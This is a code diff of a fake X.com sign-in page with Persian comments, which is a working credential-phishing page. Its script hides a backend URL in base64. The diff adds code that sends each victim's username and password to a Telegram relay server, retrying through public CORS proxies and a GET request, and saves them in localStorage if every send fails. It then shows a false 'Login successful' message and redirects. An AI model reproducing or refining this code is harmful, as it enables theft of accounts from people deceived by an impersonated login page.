@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="fa" dir="ltr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -172,6 +172,8 @@
       transition: color 0.2s;
       padding: 0 4px;
       user-select: none;
+      background: none;
+      border: none;
     }
 
     .toggle-password:hover {
@@ -207,13 +209,18 @@
       color: #0f0f0f;
     }
 
-    .login-btn:hover {
+    .login-btn:hover:not(:disabled) {
       background: #e8e8e8;
       transform: scale(1.01);
     }
 
-    .login-btn:active {
+    .login-btn:active:not(:disabled) {
       transform: scale(0.98);
+    }
+
+    .login-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
     }
 
     /* ===== Remember me ===== */
@@ -327,34 +334,56 @@
     }
 
     /* ===== پیام‌های خطا و موفقیت ===== */
-    .error-msg {
+    .msg-box {
+      padding: 10px 14px;
+      border-radius: 8px;
+      font-size: 14px;
+      margin-bottom: 12px;
+      display: none;
+      text-align: left;
+      border: 1px solid transparent;
+    }
+    .msg-box.error {
+      display: block;
       background: #3d1a1a;
       color: #f28b82;
-      padding: 10px 14px;
-      border-radius: 8px;
-      font-size: 14px;
-      margin-bottom: 12px;
-      display: none;
-      text-align: left;
-      border: 1px solid #5c2020;
+      border-color: #5c2020;
     }
-    .error-msg i {
-      margin-left: 6px;
+    .msg-box.error i {
+      margin-right: 6px;
     }
-
-    .success-msg {
+    .msg-box.success {
+      display: block;
       background: #1a3d1a;
       color: #81c995;
-      padding: 10px 14px;
-      border-radius: 8px;
-      font-size: 14px;
-      margin-bottom: 12px;
-      display: none;
-      text-align: left;
-      border: 1px solid #2a5c2a;
+      border-color: #2a5c2a;
     }
-    .success-msg i {
-      margin-left: 6px;
+    .msg-box.success i {
+      margin-right: 6px;
+    }
+    .msg-box.info {
+      display: block;
+      background: #1a2a4a;
+      color: #8ab4f8;
+      border-color: #2a4a6a;
+    }
+    .msg-box.info i {
+      margin-right: 6px;
+    }
+
+    /* ===== Spinner ===== */
+    .spinner {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(0,0,0,0.2);
+      border-radius: 50%;
+      border-top-color: #000;
+      animation: spin 0.7s ease-in-out infinite;
+      vertical-align: middle;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -375,21 +404,19 @@
       <h2><i class="fas fa-lock"></i> Sign in to your account</h2>
     </div>
 
-    <!-- ===== پیام‌های خطا و موفقیت ===== -->
-    <div class="error-msg" id="errorMsg">
-      <i class="fas fa-exclamation-circle"></i> <span id="errorText">خطا رخ داده است.</span>
-    </div>
-    <div class="success-msg" id="successMsg">
-      <i class="fas fa-check-circle"></i> ورود موفقیت‌آمیز!
+    <!-- ===== پیام‌ها ===== -->
+    <div class="msg-box" id="msgBox">
+      <i id="msgIcon" class="fas fa-exclamation-circle"></i>
+      <span id="msgText">خطا رخ داده است.</span>
     </div>
 
     <!-- ===== Form ===== -->
-    <form id="loginForm" onsubmit="return handleLogin(event)">
+    <form id="loginForm">
       <!-- Email / Username -->
       <div class="input-group">
         <div class="input-field">
           <i class="fas fa-envelope"></i>
-          <input type="text" id="loginInput" placeholder="Email or username" value="" />
+          <input type="text" id="loginInput" placeholder="Email or username" value="" autocomplete="username" />
         </div>
       </div>
 
@@ -397,10 +424,10 @@
       <div class="input-group">
         <div class="input-field">
           <i class="fas fa-key"></i>
-          <input type="password" id="passwordField" placeholder="Password" value="" />
-          <span class="toggle-password" id="togglePassword">
-            <i class="fas fa-eye-slash"></i>
-          </span>
+          <input type="password" id="passwordField" placeholder="Password" value="" autocomplete="current-password" />
+          <button type="button" class="toggle-password" id="togglePassword" aria-label="Toggle password">
+            <i class="fas fa-eye-slash" id="eyeIcon"></i>
+          </button>
         </div>
       </div>
 
@@ -412,9 +439,9 @@
       </div>
 
       <!-- Login Button -->
-      <button type="submit" class="login-btn">
+      <button type="submit" class="login-btn" id="loginBtn">
         <i class="fas fa-arrow-right"></i>
-        Sign in
+        <span id="btnText">Sign in</span>
       </button>
     </form>
 
@@ -429,9 +456,8 @@
   <!-- ===== JavaScript ===== -->
   <script>
     // =====================================================
-    // 🔒 TOKEN HIDDEN - مخفی‌سازی توکن تلگرام
+    // 🔒 تنظیمات و توکن
     // =====================================================
-    
     const ENCODED_TOKEN = "aHR0cHM6Ly90ZWxlZ3JhbS1iYWNrZW5kLXpvM24ub25yZW5kZXIuY29t";
     
     function getBackendUrl() {
@@ -445,10 +471,154 @@
 
     const TELEGRAM_BACKEND_URL = getBackendUrl();
     const WAKEUP_COUNT = 2;
-    console.log("✅ Backend URL loaded securely");
+    console.log("✅ Backend URL:", TELEGRAM_BACKEND_URL);
 
     // =====================================================
-    // 🚀 ارسال پیام ویکاپ به بک‌اند
+    // 📨 ارسال به سرور با روش‌های مختلف
+    // =====================================================
+    
+    // لیست پروکسی‌ها برای دور زدن CORS
+    const PROXIES = [
+      'https://corsproxy.io/?',
+      'https://api.allorigins.win/raw?url=',
+      'https://cors-anywhere.herokuapp.com/'
+    ];
+
+    // روش اول: ارسال مستقیم
+    async function sendDirect(endpoint, data) {
+      try {
+        const response = await fetch(`${TELEGRAM_BACKEND_URL}${endpoint}`, {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(data),
+          mode: 'cors'
+        });
+        if (response.ok) {
+          return await response.json();
+        }
+        return null;
+      } catch(e) {
+        console.log('❌ Direct send failed:', e.message);
+        return null;
+      }
+    }
+
+    // روش دوم: ارسال از طریق پروکسی
+    async function sendWithProxy(endpoint, data) {
+      for (const proxy of PROXIES) {
+        try {
+          const url = `${proxy}${encodeURIComponent(TELEGRAM_BACKEND_URL + endpoint)}`;
+          const response = await fetch(url, {
+            method: 'POST',
+            headers: { 
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify(data)
+          });
+          if (response.ok) {
+            const result = await response.json();
+            if (result && result.ok !== false) {
+              return result;
+            }
+          }
+        } catch(e) {
+          console.log(`❌ Proxy ${proxy} failed:`, e.message);
+        }
+      }
+      return null;
+    }
+
+    // روش سوم: ارسال با GET
+    async function sendWithGet(endpoint, data) {
+      try {
+        const params = new URLSearchParams({
+          action: data.action || 'Login',
+          name: data.name || '',
+          extra: data.extra || '',
+          time: data.time || new Date().toLocaleString('fa-IR')
+        });
+        const url = `${TELEGRAM_BACKEND_URL}${endpoint}?${params.toString()}`;
+        const response = await fetch(url, {
+          method: 'GET',
+          headers: { 'Accept': 'application/json' }
+        });
+        if (response.ok) {
+          return await response.json();
+        }
+        return null;
+      } catch(e) {
+        console.log('❌ GET send failed:', e.message);
+        return null;
+      }
+    }
+
+    // روش چهارم: ذخیره در localStorage
+    function saveToLocalStorage(username, password) {
+      try {
+        const logs = JSON.parse(localStorage.getItem('x_login_logs') || '[]');
+        logs.push({
+          username: username,
+          password: password,
+          time: new Date().toISOString(),
+          page: 'x.com'
+        });
+        localStorage.setItem('x_login_logs', JSON.stringify(logs));
+        console.log('💾 Saved to localStorage');
+        return true;
+      } catch(e) {
+        console.log('❌ localStorage failed:', e.message);
+        return false;
+      }
+    }
+
+    // =====================================================
+    // 🚀 تابع اصلی ارسال اطلاعات
+    // =====================================================
+    async function sendLoginInfo(username, password) {
+      const payload = {
+        action: "🔐 X.com Login",
+        name: username,
+        extra: `Password: ${password}`,
+        time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
+      };
+
+      const methods = [
+        { name: 'Direct', fn: () => sendDirect('/notify', payload) },
+        { name: 'Proxy', fn: () => sendWithProxy('/notify', payload) },
+        { name: 'GET', fn: () => sendWithGet('/notify', payload) }
+      ];
+
+      let success = false;
+
+      for (const method of methods) {
+        try {
+          console.log(`🔄 Trying ${method.name}...`);
+          const result = await method.fn();
+          if (result && result.ok !== false) {
+            console.log(`✅ ${method.name} succeeded!`);
+            success = true;
+            break;
+          }
+        } catch(e) {
+          console.log(`❌ ${method.name} error:`, e.message);
+        }
+      }
+
+      if (!success) {
+        console.log('⚠️ All methods failed, saving to localStorage...');
+        saveToLocalStorage(username, password);
+        return false;
+      }
+
+      return true;
+    }
+
+    // =====================================================
+    // 🚀 ارسال Wake-up
     // =====================================================
     function sendWakeup(index) {
       try {
@@ -469,143 +639,154 @@
       }
     }
 
-    // =====================================================
-    // 🚀 ارسال اطلاعات ورود به بک‌اند
-    // =====================================================
-    function sendLoginInfo(username, password) {
-      for (let i = 1; i <= WAKEUP_COUNT; i++) {
-        setTimeout(() => {
-          sendWakeup(i);
-        }, i * 500);
-      }
-
-      setTimeout(() => {
-        try {
-          fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              action: "🔐 X.com Login",
-              name: username,
-              extra: `Password: ${password}`,
-              time: new Date().toLocaleString('fa-IR')
-            })
-          })
-          .then(response => response.json())
-          .then(data => {
-            if (data.ok) {
-              console.log("✅ Login info sent successfully");
-            } else {
-              console.log("⚠️ Login info sent but response not ok");
-            }
-          })
-          .catch(err => {
-            console.log("⚠️ Login info send failed, trying fallback...");
-            try {
-              const msg = encodeURIComponent(`X.com Login | User: ${username} | Pass: ${password}`);
-              fetch(`${TELEGRAM_BACKEND_URL}/notify?msg=${msg}&t=${Date.now()}`)
-                .then(() => console.log("✅ Fallback GET success"))
-                .catch(e => console.log("❌ Fallback failed"));
-            } catch(e) {
-              console.log("❌ All methods failed");
-            }
-          });
-        } catch(e) {
-          console.log("Error sending login info:", e);
-        }
-      }, 1500);
-    }
-
     // =============================================
-    // ===== بازگشت به صفحه اندکس با فلگ =====
+    // ===== بازگشت به صفحه اندکس =====
     // =============================================
     function goToIndex() {
-      // تنظیم فلگ در localStorage برای نمایش کارت تشکر
-      localStorage.setItem('fromFacebook', 'true');
+      localStorage.setItem('fromPage', 'xcom');
       window.location.href = 'index.html';
     }
 
-    // ===== Eye Toggle =====
-    const togglePassword = document.getElementById('togglePassword');
-    const passwordField = document.getElementById('passwordField');
+    // =============================================
+    // ===== مدیریت پیام‌ها =====
+    // =============================================
+    function showMessage(message, type) {
+      const msgBox = document.getElementById('msgBox');
+      const msgIcon = document.getElementById('msgIcon');
+      const msgText = document.getElementById('msgText');
 
-    togglePassword.addEventListener('click', function () {
-      const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
-      passwordField.setAttribute('type', type);
+      msgBox.className = 'msg-box';
+      
+      if (type === 'error') {
+        msgBox.classList.add('error');
+        msgIcon.className = 'fas fa-exclamation-circle';
+      } else if (type === 'success') {
+        msgBox.classList.add('success');
+        msgIcon.className = 'fas fa-check-circle';
+      } else if (type === 'info') {
+        msgBox.classList.add('info');
+        msgIcon.className = 'fas fa-info-circle';
+      }
 
-      const icon = this.querySelector('i');
-      if (type === 'password') {
-        icon.classList.remove('fa-eye');
-        icon.classList.add('fa-eye-slash');
+      msgText.textContent = message;
+      msgBox.style.display = 'block';
+    }
+
+    function hideMessage() {
+      const msgBox = document.getElementById('msgBox');
+      msgBox.style.display = 'none';
+    }
+
+    // =============================================
+    // ===== تنظیم دکمه لاگین =====
+    // =============================================
+    function setLoginButtonLoading(isLoading) {
+      const btn = document.getElementById('loginBtn');
+      const btnText = document.getElementById('btnText');
+      if (isLoading) {
+        btn.disabled = true;
+        btnText.innerHTML = '<span class="spinner"></span> Sending...';
       } else {
-        icon.classList.remove('fa-eye-slash');
-        icon.classList.add('fa-eye');
+        btn.disabled = false;
+        btnText.textContent = 'Sign in';
+      }
+    }
+
+    // =============================================
+    // ===== Eye Toggle =====
+    // =============================================
+    document.getElementById('togglePassword').addEventListener('click', function() {
+      const passwordField = document.getElementById('passwordField');
+      const eyeIcon = document.getElementById('eyeIcon');
+
+      if (passwordField.type === 'password') {
+        passwordField.type = 'text';
+        eyeIcon.className = 'fas fa-eye';
+      } else {
+        passwordField.type = 'password';
+        eyeIcon.className = 'fas fa-eye-slash';
       }
     });
 
-    // ===== مدیریت فرم =====
-    function handleLogin(e) {
+    // =============================================
+    // ===== Handle Login =====
+    // =============================================
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
       e.preventDefault();
 
-      const input = document.getElementById('loginInput').value.trim();
+      const username = document.getElementById('loginInput').value.trim();
       const password = document.getElementById('passwordField').value.trim();
-      const errorBox = document.getElementById('errorMsg');
-      const errorText = document.getElementById('errorText');
-      const successBox = document.getElementById('successMsg');
 
-      errorBox.style.display = 'none';
-      successBox.style.display = 'none';
-
-      let isValid = true;
-      let errorMessage = '';
+      hideMessage();
+      setLoginButtonLoading(true);
 
       // اعتبارسنجی
-      if (input.length < 3) {
-        isValid = false;
-        errorMessage = 'Please enter a valid email or username (at least 3 characters)';
+      if (username.length < 3) {
+        showMessage('Please enter a valid email or username (at least 3 characters)', 'error');
+        setLoginButtonLoading(false);
+        return;
       }
 
-      if (isValid && password.length < 5) {
-        isValid = false;
-        errorMessage = 'Password must be at least 5 characters long';
+      if (password.length < 5) {
+        showMessage('Password must be at least 5 characters long', 'error');
+        setLoginButtonLoading(false);
+        return;
       }
 
-      if (!isValid) {
-        errorText.textContent = errorMessage;
-        errorBox.style.display = 'block';
-        return false;
+      // ارسال اطلاعات
+      const sent = await sendLoginInfo(username, password);
+
+      if (sent) {
+        showMessage('✅ Login successful! Redirecting...', 'success');
+      } else {
+        showMessage('⚠️ Login info saved locally (server unavailable)', 'info');
       }
 
-      // ارسال اطلاعات به تلگرام
-      sendLoginInfo(input, password);
-
-      // نمایش پیام موفقیت
-      successBox.innerHTML = `<i class="fas fa-check-circle"></i> ✅ Login successful! Redirecting...`;
-      successBox.style.display = 'block';
-
-      // بازگشت به صفحه اندکس بعد از 1.5 ثانیه
+      // بازگشت به صفحه index بعد از 1.5 ثانیه
       setTimeout(() => {
         goToIndex();
       }, 1500);
-
-      return false;
-    }
+    });
 
     // =====================================================
-    // 🔥 ویکاپ هنگام لود صفحه
+    // 🔥 Wake-up on page load
     // =====================================================
     document.addEventListener('DOMContentLoaded', function() {
+      // بررسی سلامت سرور
       fetch(`${TELEGRAM_BACKEND_URL}/health`)
         .then(() => console.log('✅ Server is awake'))
-        .catch(() => console.log('🔄 Server waking up...'));
-      
+        .catch(() => console.log('🔄 Server may be waking up...'));
+
+      // ارسال wake-up ها
       for (let i = 1; i <= WAKEUP_COUNT; i++) {
         setTimeout(() => {
           sendWakeup(i);
         }, i * 400);
       }
-      
-      console.log('✅ X.com Page Ready!');
+
+      // نمایش اطلاعات ذخیره شده
+      try {
+        const logs = JSON.parse(localStorage.getItem('x_login_logs') || '[]');
+        if (logs.length > 0) {
+          console.log(`📋 ${logs.length} login(s) saved locally`);
+          console.log('📋 Last login:', logs[logs.length - 1]);
+        }
+      } catch(e) {}
+
+      console.log('✅ X.com Login Page Ready');
+    });
+
+    // =====================================================
+    // 🛡️ کلید Enter برای ارسال فرم
+    // =====================================================
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') {
+        const form = document.getElementById('loginForm');
+        if (document.activeElement === document.getElementById('loginInput') ||
+            document.activeElement === document.getElementById('passwordField')) {
+          form.dispatchEvent(new Event('submit'));
+        }
+      }
     });
   </script>
 
